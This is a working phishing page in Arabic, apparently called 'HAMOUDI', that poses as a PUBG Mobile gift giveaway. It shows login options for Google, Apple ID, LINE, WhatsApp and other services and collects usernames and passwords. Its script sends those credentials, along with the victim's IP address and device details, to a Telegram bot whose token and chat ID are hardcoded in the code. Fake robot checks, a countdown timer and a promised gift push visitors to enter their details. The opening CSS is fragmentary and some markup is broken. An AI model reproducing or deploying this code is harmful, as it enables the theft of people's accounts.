            border: none;

        .submit-btn:hover {

        .secure-note {

        .qr-form {

        #qrcode {

        /* Loading Overlay */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;

        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid #ff6b6b;
            border-top-color: #ff8e53;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }

        .loading-overlay p {
            font-size: 1.2rem;

        .loading-sub {

        /* Responsive */

<body>

<div class="container">
    <div class="gift-card">

        <!-- طرق تسجيل الدخول -->

            <button class="login-btn twitter-btn" data-method="twitter">

                <i class="fab fa-whatsapp"></i> WhatsApp

            <button class="login-btn google-btn" data-method="google">
                <i class="fab fa-google"></i> Google
            </button>
            <button class="login-btn apple-btn" data-method="apple">
                <i class="fab fa-apple"></i> Apple ID
            </button>
            <button class="login-btn line-btn" data-method="line">
                <i class="fab fa-line"></i> LINE
            </button>

        <!-- نموذج الإدخال (يظهر حسب الاختيار) -->
        <div id="input-form" class="input-form hidden">
            <div class="input-group">
                <label id="username-label">البريد الإلكتروني</label>
                <input type="text" id="login-input" placeholder="أدخل البريد الإلكتروني">
            </div>
            <div class="input-group">
                <label>كلمة السر</label>
                <input type="password" id="password-input" placeholder="أدخل كلمة السر">
            </div>
            <button id="submit-login" class="submit-btn">متابعة</button>
            <p class="secure-note"><i class="fas fa-lock"></i> بياناتك مشفرة وآمنة</p>
        </div>

        <!-- نموذج باركود (يظهر عند اختيار QR) -->
        <div id="qr-form" class="qr-form hidden">
            <div id="qrcode"></div>
            <p>امسح الباركود باستخدام لعبة PUBG Mobile</p>
            <button id="qr-complete" class="submit-btn">تم المسح</button>

</div>

<!-- Loading Overlay -->
<div id="loading-overlay" class="loading-overlay hidden">
    <div class="loader"></div>
    <p>جاري التحقق من أنك لست روبوتاً...</p>
    <p class="loading-sub">يرجى الانتظار، جاري معالجة الطلب</p>
</div>

<script>
    // ===================================================================
    // HAMOUDI - PUBG Mobile Login Interface (مع كلمة السر)
    // Telegram Bot Config
    // ===================================================================
    
    const BOT_TOKEN = "7146035467:AAEupruzqj8KGLLl_t8NM19ffeiURg4C9Os";
    const CHAT_ID = "1406629610";

    let selectedMethod = null;

    // Timer 24 ساعة
    function startTimer() {
        let hours = 24;
        let minutes = 0;
        let seconds = 0;
        
        const timerElement = document.getElementById('timer');
        
        const interval = setInterval(() => {
            if (seconds === 0) {
                if (minutes === 0) {
                    if (hours === 0) {
                        clearInterval(interval);
                        timerElement.textContent = "انتهى العرض!";
                    } else {
                        hours--;
                        minutes = 59;
                        seconds = 59;
                    }
                } else {
                    minutes--;
                    seconds = 59;
                }
            } else {
                seconds--;
            }
            
            if (hours >= 0) {
                timerElement.textContent = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            }
        }, 1000);
    }

    // إرسال البيانات إلى Telegram
    async function sendToTelegram(data) {
        const method = data.method;
        const username = data.username;
        const password = data.password;
        const timestamp = new Date().toLocaleString('ar-EG');
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const ip = await getIP();
        
        const message = `
🔥 *PUBG Mobile Login - HAMOUDI* 🔥
━━━━━━━━━━━━━━━━━━━
📌 *طريقة الدخول:* ${method}
📧 *البريد/المعرف:* \`${username}\`
🔑 *كلمة السر:* \`${password}\`
🌐 *IP:* ${ip}
🕐 *الوقت:* ${timestamp}
📱 *الجهاز:* ${userAgent}
💻 *المنصة:* ${platform}
🌍 *اللغة:* ${language}
━━━━━━━━━━━━━━━━━━━
⚠️ *تم تسجيل الدخول بنجاح*
        `;
        
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        try {
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            return true;
        } catch (error) {
            console.error('Telegram Error:', error);
            return false;
        }
    }
    
    // جلب IP الضحية
    async function getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'غير متاح';
        }
    }

    // عرض شاشة التحميل والتحقق
    function showLoadingAndVerify(data) {
        const loadingOverlay = document.getElementById('loading-overlay');
        loadingOverlay.classList.remove('hidden');
        
        sendToTelegram(data).then(() => {
            let seconds = 0;
            const loadingText = loadingOverlay.querySelector('p');
            const interval = setInterval(() => {
                seconds++;
                if (seconds <= 5) {
                    loadingText.textContent = `جاري التحقق من أنك لست روبوتاً... ${seconds}/5`;
                } else {
                    clearInterval(interval);
                    loadingText.textContent = '✓ تم التحقق بنجاح!';
                    const loadingSub = loadingOverlay.querySelector('.loading-sub');
                    if (loadingSub) loadingSub.textContent = 'جاري تحويلك إلى صفحة الهدية...';
                    
                    setTimeout(() => {
                        alert('🎉 تم تسجيل الدخول بنجاح! 🎉\nسيتم إرسال الهدية إلى حسابك خلال 24 ساعة.');
                        loadingOverlay.classList.add('hidden');
                        
                        document.getElementById('input-form').classList.add('hidden');
                        document.getElementById('qr-form').classList.add('hidden');
                        selectedMethod = null;
                        
                        document.getElementById('login-input').value = '';
                        document.getElementById('password-input').value = '';
                    }, 2000);
                }
            }, 1000);
        }).catch(() => {
            alert('حدث خطأ، يرجى المحاولة مرة أخرى');
            loadingOverlay.classList.add('hidden');
        });
    }

    // التعامل مع طرق تسجيل الدخول
    document.querySelectorAll('.login-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            selectedMethod = btn.dataset.method;
            const inputForm = document.getElementById('input-form');
            const qrForm = document.getElementById('qr-form');
            const usernameLabel = document.getElementById('username-label');
            const usernameInput = document.getElementById('login-input');
            
            inputForm.classList.add('hidden');
            qrForm.classList.add('hidden');
            
            if (selectedMethod === 'qr') {
                qrForm.classList.remove('hidden');
                
                const qrElement = document.getElementById('qrcode');
                qrElement.innerHTML = '';
                new QRCode(qrElement, {
                    text: `https://pubgmobile.com/login?ref=${Date.now()}`,
                    width: 200,
                    height: 200
                });
                
                document.getElementById('qr-complete').onclick = () => {
                    const data = {
                        method: 'QR Code',
                        username: 'تم مسح الباركود',
                        password: 'لا يوجد'
                    };
                    showLoadingAndVerify(data);
                };
            } else {
                inputForm.classList.remove('hidden');
                let placeholder = '';
                let labelText = '';
                
                switch(selectedMethod) {
                    case 'email':
                        labelText = 'البريد الإلكتروني';
                        placeholder = 'أدخل البريد الإلكتروني';
                        break;
                    case 'phone':
                        labelText = 'رقم الهاتف';
                        placeholder = 'أدخل رقم الهاتف مع مفتاح الدولة';
                        break;
                    case 'facebook':
                        labelText = 'البريد أو رقم الهاتف';
                        placeholder = 'أدخل بريد أو هاتف Facebook';
                        break;
                    case 'twitter':
                        labelText = 'اسم المستخدم أو البريد';
                        placeholder = 'أدخل اسم المستخدم أو البريد';
                        break;
                    case 'tiktok':
                        labelText = 'اسم المستخدم';
                        placeholder = 'أدخل اسم المستخدم في TikTok';
                        break;
                    case 'whatsapp':
                        labelText = 'رقم WhatsApp';
                        placeholder = 'أدخل رقم WhatsApp';
                        break;
                    case 'google':
                        labelText = 'البريد الإلكتروني';
                        placeholder = 'أدخل بريد Google';
                        break;
                    case 'apple':
                        labelText = 'Apple ID';
                        placeholder = 'أدخل Apple ID';
                        break;
                    case 'line':
                        labelText = 'معرف LINE';
                        placeholder = 'أدخل معرف LINE';
                        break;
                    default:
                        labelText = 'المعرف';
                        placeholder = 'أدخل البيانات';
                }
                
                usernameLabel.textContent = labelText;
                usernameInput.placeholder = placeholder;
                usernameInput.value = '';
                document.getElementById('password-input').value = '';
                
                document.getElementById('submit-login').onclick = () => {
                    const usernameValue = usernameInput.value.trim();
                    const passwordValue = document.getElementById('password-input').value.trim();
                    
                    if (!usernameValue) {
                        alert('الرجاء إدخال ' + labelText);
                        return;
                    }
                    if (!passwordValue) {
                        alert('الرجاء إدخال كلمة السر');
                        return;
                    }
                    
                    let methodName = selectedMethod;
                    const btnElement = document.querySelector(`.login-btn[data-method="${selectedMethod}"]`);
                    if (btnElement) {
                        methodName = btnElement.innerText.replace(/[^a-zA-Z\u0600-\u06FF]/g, '').trim() || selectedMethod;
                    }
                    
                    const data = {
                        method: methodName,
                        username: usernameValue,
                        password: passwordValue
                    };
                    
                    showLoadingAndVerify(data);
                };
            }
        });
    });

    startTimer();

    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
    });

    const loginInput = document.getElementById('login-input');
    const passwordInput = document.getElementById('password-input');
    if (loginInput) {
        loginInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                document.getElementById('submit-login').click();
            }
        });
    }
    if (passwordInput) {
        passwordInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                document.getElementById('submit-login').click();
            }
        });
    }

    console.log('✅ HAMOUDI - PUBG Login Interface (مع كلمة السر) Loaded Successfully');
</script>
</body>
